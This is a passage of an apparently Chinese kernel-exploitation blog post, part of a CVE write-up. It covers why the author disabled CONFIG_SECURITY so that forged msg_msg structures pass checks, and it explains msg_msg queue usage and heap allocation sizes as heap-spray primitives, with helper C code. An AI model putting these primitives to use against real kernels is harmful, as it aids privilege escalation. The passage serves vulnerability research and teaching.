      <p>注意的是，在我写的项目里的CVE环境中，去掉了配置：<code>CONFIG_SECURITY=n</code>，原因是在<code>load_msg()</code>函数中申请<code>msg_msg</code>结构体时，如下所示，会调用到<code>security_msg_msg_alloc()</code>函数，给<code>msg_msg</code>结构体中的<code>security</code>指针赋值，导致下面漏洞利用时读取伪造<code>msg_msg</code>结构体由于检测<code>security</code>导致出错。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /ipc/msgutil.c</span></span><br><span class="line"><span class="function">struct msg_msg *<span class="title">load_msg</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> __user *src, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EFAULT;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">	msg = alloc_msg(len);</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	err = security_msg_msg_alloc(msg);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out_err;</span><br><span class="line">	<span class="keyword">return</span> msg;</span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>而去掉了配置：<code>CONFIG_SECURITY=n</code>，可以不用<code>security</code>指针，这样就不会出错了</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11.14 /include/linux/security.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq, struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">			      struct task_struct *target, <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* CONFIG_SECURITY */</span></span></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_msg_alloc</span><span class="params">(struct msg_msg *msg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_msg_free</span><span class="params">(struct msg_msg *msg)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_alloc</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">security_msg_queue_free</span><span class="params">(struct kern_ipc_perm *msq)</span></span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_associate</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					       <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgctl</span><span class="params">(struct kern_ipc_perm *msq, <span class="keyword">int</span> cmd)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgsnd</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg, <span class="keyword">int</span> msqflg)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">security_msg_queue_msgrcv</span><span class="params">(struct kern_ipc_perm *msq,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct msg_msg *msg,</span></span></span><br><span class="line"><span class="params"><span class="function">					    struct task_struct *target,</span></span></span><br><span class="line"><span class="params"><span class="function">					    <span class="keyword">long</span> type, <span class="keyword">int</span> mode)</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>	<span class="comment">/* CONFIG_SECURITY */</span></span></span><br></pre></td></tr></table></div></figure>

<p>但是在<code>bsauce</code>师傅提供的环境中有添加该配置，而<code>security</code>指针的值却还是为空。简单看了一下源码，如下函数链</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_msg()-&gt;security_msg_msg_alloc()-&gt;lsm_msg_msg_alloc()</span><br></pre></td></tr></table></div></figure>

<p>对于<code>lsm_msg_msg_alloc()</code>函数如下定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lsm_msg_msg_alloc</span><span class="params">(struct msg_msg *mp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (blob_sizes.lbs_msg_msg == <span class="number">0</span>) &#123;</span><br><span class="line">		mp-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mp-&gt;security = kzalloc(blob_sizes.lbs_msg_msg, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mp-&gt;security == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到这里进行相关赋值，如果满足<code>blob_sizes.lbs_msg_msg == 0</code>那么其<code>security</code>指针为空，后续检测时也依据此判断不检测。而对于这个<code>blob_sizes.lbs_msg_msg</code>不是很熟悉，可能是我的相关配置问题吧。这里为了方便，我就直接将这个配置去掉了。</p>
<p>此外经过实际测试，源码也可以看出来，其实<code>security</code>也就是一个堆地址(以0x8递增)，是不断变化的，但是如果能泄露出其中一个，那么后续检测就能都通过了。</p>

        <h1 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1>
      <p>完成这个漏洞的利用还是需要一些前置知识的，刚好利用这个漏洞重新完善一下相关的知识点。</p>

        <h2 id="1-msg-msg结构体—kmalloc-16至kmalloc-1024"   >
          <a href="#1-msg-msg结构体—kmalloc-16至kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-msg-msg结构体—kmalloc-16至kmalloc-1024" class="headerlink" title="1.msg_msg结构体—kmalloc-16至kmalloc-1024"></a>1.msg_msg结构体—kmalloc-16至kmalloc-1024</h2>
      <p>这个在之前也总结过，不过总结得有些错误，也不太完善，这里再好好总结一下</p>
<p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >【NOTES.0x08】Linux Kernel Pwn IV：通用结构体与技巧 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linux内核中利用msg_msg结构实现任意地址读写 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linux的进程间通信 - 消息队列 · Poor Zorro’s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>《Linux系统编程手册》</p>
<p>虽然写的是最大<code>kmalloc-1024</code>，但是在堆喷时，可以连续<code>kmalloc(1024)</code>从而获得连续的堆内存分布，这样都释放掉之后再经过回收机制就可以申请到更大的<code>kmallo-xx</code>了。</p>

        <h3 id="1-使用方法"   >
          <a href="#1-使用方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-使用方法" class="headerlink" title="(1)使用方法"></a>(1)使用方法</h3>
      
        <h4 id="①创建"   >
          <a href="#①创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建" class="headerlink" title="①创建"></a>①创建</h4>
      <ul>
<li><p>首先创建<code>queue_id</code>管理标志，对应于内核空间的<code>msg_queue</code>管理结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//key要么使用ftok()算法生成,要么指定为IPC_PRIVATE</span></span><br><span class="line"><span class="comment">//代表着该消息队列在内核中唯一的标识符</span></span><br><span class="line"><span class="comment">//使用IPC_PRIVATE会生成全新的消息队列IPC对象</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>使用简单封装的<code>msgget</code>函数或者系统调用号<code>__NR_msgget</code>，之后保存数据的消息就会在这个<code>queue_id</code>管理标志，以及内核空间的<code>msg_queue</code>管理结构下进行创建</p>
</li>
</ul>

        <h4 id="②数据传输"   >
          <a href="#②数据传输" class="heading-link"><i class="fas fa-link"></i></a><a href="#②数据传输" class="headerlink" title="②数据传输"></a>②数据传输</h4>
      <ul>
<li><p>写入消息：</p>
<p>然后就可以依据<code>queue_id</code>写入消息了，不同于<code>pipe</code>和<code>socketpair</code>，这个需要特定的封装函数（<code>msgsnd/msgrcv</code>）或者对应的系统调用（<code>__NR_msgrcv/__NR_msgsnd</code>）来实现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_buf实际上为msgp,里面包含mtype,这个mtype在后面的堆块构造中很有用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>读取消息：</p>
<p>之后即可依据<code>queue_id</code>读取消息</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//任意指定</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>可通过设置该值来实现不同顺序的消息读取，在之后的堆块构造中很有用</p>
<ul>
<li>在写入消息时，指定<code>mtype</code>，后续接收消息时可以依据此<code>mtype</code>来进行非顺序接收</li>
<li>在读取消息时，指定<code>msgtyp</code>，分为如下情况<ul>
<li><code>msgtyp</code>大于0：那么在<code>find_msg</code>函数中，就会将遍历寻找消息队列里的第一条等于<code>msgtyp</code>的消息，然后进行后续操作。</li>
<li><code>msgtyp</code>等于0：即类似于顺序读取，<code>find_msg</code>函数会直接获取到消息队列首个消息。</li>
<li><code>msgtyp</code>小于0：会将等待的消息当成优先队列来处理，<code>mtype</code>的值越小，其优先级越高。</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>可以关注一下<code>MSG_NOERROR</code>标志位，比如说<code>msg_flag</code>没有设置<code>MSG_NOERROR</code>的时候，那么情况如下：</p>
<p>假定获取消息时输入的长度<code>m_ts_size</code>为<code>0x200</code>，且这个长度大于通过<code>find_msg()</code>函数获取到的消息长度<code>0x200</code>，则可以顺利读取，如果该长度小于获取到的消息长度<code>0x200</code>，则会出现如下错误</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>但是如果设置了<code>MSG_NOERROR</code>，那么即使传入接收消息的长度小于获取到的消息长度，仍然可以顺利获取，但是多余的消息会被截断，相关内存还是会被释放，这个在源代码中也有所体现。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcv函数中</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>此外还有更多的<code>msg_flag</code>，就不一一举例了。</p>

        <h4 id="③释放"   >
          <a href="#③释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#③释放" class="headerlink" title="③释放"></a>③释放</h4>
      <p>这个主要是用到<code>msgctl</code>封装函数或者<code>__NR_msgctl</code>系统调用，直接释放掉所有的消息结构，包括申请的<code>msg_queue</code>的结构</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中IPC_RMID这个cmd命令代表释放掉该消息队列的所有消息,各种内存结构体等</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id,IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>不过一般也用不到，可能某些合并obj的情况能用到?</p>
<p>此外还有更多的<code>cmd</code>命令，常用来设置内核空间的<code>msg_queue</code>结构上的相关数据，不过多介绍了。</p>

        <h4 id="总结"   >
          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结" class="headerlink" title="总结"></a>总结</h4>
      <p>总结一下大致的使用方法如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-内存分配与释放"   >
          <a href="#2-内存分配与释放" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-内存分配与释放" class="headerlink" title="(2)内存分配与释放"></a>(2)内存分配与释放</h3>
      
        <h4 id="①创建-1"   >
          <a href="#①创建-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①创建-1" class="headerlink" title="①创建"></a>①创建</h4>
      
        <h5 id="A-内存申请"   >
          <a href="#A-内存申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-内存申请" class="headerlink" title="A.内存申请"></a>A.内存申请</h5>
      <ul>
<li><p>还是需要先创建<code>msg_queue</code>结构体，使用<code>msgget</code>函数，调用链为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>主要还是关注最后的<code>newque()</code>函数，在该函数中使用<code>kvmalloc()</code>申请堆块，大小为0x100，属于<code>kmalloc-256</code>，(不同版本大小貌似不同)。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 